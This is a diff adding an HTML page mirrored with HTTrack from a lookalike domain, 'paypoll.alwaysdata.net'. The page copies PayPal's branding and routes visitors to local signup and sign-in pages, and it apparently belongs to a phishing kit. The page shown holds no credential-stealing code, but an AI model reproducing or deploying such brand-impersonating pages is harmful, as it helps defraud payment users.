@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from paypoll.alwaysdata.net/accountselection.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 04 May 2025 10:55:06 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Account Selection</title>
+    <style>
+        body {
+            font-family: "Helvetica Neue", Arial, sans-serif;
+            background-color: #f5f7fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .signup-container {
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+            margin: 15% auto;
+        }
+        .signup-container .logo {
+            margin-bottom: 24px;
+        }
+        .signup-container .logo img {
+            max-width: 150px;
+        }
+        .signup-container h1 {
+            font-size: 24px;
+            color: #003087;
+            margin-bottom: 20px;
+        }
+        .signup-container p {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .account-option {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #f9f9f9;
+            padding: 15px 20px;
+            border: 1px solid #dcdcdc;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .account-option:hover {
+            background-color: #f1f1f1;
+        }
+        .account-option .details {
+            flex-grow: 1;
+            text-align: left;
+        }
+        .account-option .details h3 {
+            font-size: 18px;
+            color: #003087;
+            margin: 0;
+        }
+        .account-option .details p {
+            font-size: 14px;
+            color: #666;
+            margin: 0;
+        }
+        .account-option .select-button {
+            background-color: #0070ba;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .account-option .select-button:hover {
+            background-color: #005ea6;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        .footer a {
+            color: #0070ba;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <script>
+        function redirectToSignup(accountType) {
+            if (accountType === 'personal') {
+                window.location.href = 'signup097a.html?type=personal';
+            } else if (accountType === 'business') {
+                window.location.href = 'signupf761.html?type=business';
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="signup-container">
+        <div class="logo">
+            <img src="logo.png" alt="PayPal Logo">
+        </div>
+        <h1>Choose Your Account Type</h1>
+        <p>Select the type of account that best suits your needs.</p>
+        <div class="account-option" onclick="redirectToSignup('personal')">
+            <div class="details">
+                <h3>Personal Account</h3>
+                <p>Shop online or send payments to friends and family.</p>
+            </div>
+            <button class="select-button">Select</button>
+        </div>
+        <div class="account-option" onclick="redirectToSignup('business')">
+            <div class="details">
+                <h3>Business Account</h3>
+                <p>Accept payments and send invoices to your customers.</p>
+            </div>
+            <button class="select-button">Select</button>
+        </div>
+        <div class="footer">
+            <p>Already have an account? <a href="signin.html">Sign In</a></p>
+        </div>
+    </div>
+</body>
+
+<!-- Mirrored from paypoll.alwaysdata.net/accountselection.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 04 May 2025 10:55:06 GMT -->
+</html>
